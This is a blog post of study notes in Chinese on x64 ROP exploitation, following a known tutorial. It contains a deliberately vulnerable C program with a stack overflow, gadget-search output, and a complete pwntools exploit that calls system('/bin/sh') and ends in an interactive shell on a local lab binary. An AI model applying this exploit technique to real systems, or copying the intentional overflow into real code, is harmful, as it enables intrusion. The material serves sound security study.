---
title: ROPgadgets
date: 2018-03-17 19:27:06
tags: PWN

---

## 0x00 前言：

阅读蒸米师傅的一步一步学习ROP做的笔记

<!--more-->

## 0x01 程序源码：

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void systemaddr()
{
	void* handle = dlopen("libc.so.6", RTLD_LAZY);
	printf("%p\n",dlsym(handle,"system"));
	fflush(stdout);
}

void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
	systemaddr();
	write(1, "Hello, World\n", 13);
	vulnerable_function();
}
```

编译程序：

```
gcc -fno-stack-protector level4.c -o level4 -ldl
```

这里引用蒸米师傅的原话。。。（感觉自己总结的话语言组织不太行，这里就牢记蒸米师傅的原话）

> 我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。

这里我们先从level4中找，看看有没有：
​    

```
mask@mask-virtual-machine:~/mzheng$ ROPgadget --binary level4 --only "pop|ret"
Gadgets information
============================================================
0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008b0 : pop r14 ; pop r15 ; ret
0x00000000004008b2 : pop r15 ; ret
0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004006f5 : pop rbp ; ret
0x00000000004008b3 : pop rdi ; ret
0x00000000004008b1 : pop rsi ; pop r15 ; ret
0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400619 : ret
0x0000000000400672 : ret 0x2009
0x0000000000400725 : ret 0xc148

Unique gadgets found: 13
```

可以看到0x00000000004008b3 处就有我们想要的

那么，写一哈exp：

```
!/usr/bin/env python

from pwn import *

libc = ELF('libc.so.6')

p = process('./level4')

binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
print "binsh_addr_offset = " + hex(binsh_addr_offset)

    

print "\n##########receiving system addr##########\n"
system_addr_str = p.recvuntil('\n')

system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)
binsh_addr = system_addr + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)

pop_ret_addr = 0x00000000004008b3
print "pop_ret_addr = " + hex(pop_ret_addr)

    

p.recv()

payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)

    
    

print "\n##########sending payload##########\n"
p.send(payload)

p.interactive()
```

运行一哈：
​    

```
mask@mask-virtual-machine:~/mzheng$ vim exp0.py
mask@mask-virtual-machine:~/mzheng$ python exp0.py 
[*] '/home/mask/mzheng/libc.so.6'
Arch: amd64-64-little
RELRO:Partial RELRO
Stack:Canary found
NX:   NX enabled
PIE:  PIE enabled
[+] Starting local process './level4': pid 13432
binsh_addr_offset = 0x13669b

##########receiving system addr##########

system_addr = 0x7fbee46b0640
binsh_addr = 0x7fbee47e6cdb
pop_ret_addr = 0x4008b3

##########sending payload##########

[*] Switching to interactive mode
$ whoami
mask
$  
```

（当然，gadgets在libc.so。6里找也是可以的，因为程序运行时会加载）



